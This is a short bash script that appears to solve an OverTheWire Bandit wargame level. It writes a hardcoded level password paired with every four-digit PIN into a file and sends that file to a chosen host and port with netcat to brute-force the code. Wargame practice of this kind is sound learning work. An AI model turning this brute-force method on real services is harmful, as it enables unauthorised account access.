#!/bin/bash

# overthewire bandit bruteforcing challenge


echo "creating attemps.txt"
touch attempts.txt
echo "starting to write password + pincode..."

echo -ne "####				(33%)\r"
sleep 0.5
echo -ne "################		(66%)\r"
sleep 0.5
echo -ne "##############################(100%)\r"

for i in range {0..10000}; do
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> attempts.txt
done

echo "done, look in ./attempts.txt"

read -n1 -p "Feed into netcat?[y/n]: " feed
printf "\n"
case $feed in
	y|Y)
		read -p "input ip" ip
		read -p "input port" port
		echo "starting to feed the program on port ${port}..."
		sleep 1
		nc $ip $port < attempts.txt
		;;
	n|N) printf "\nExiting... bye now\n"
esac

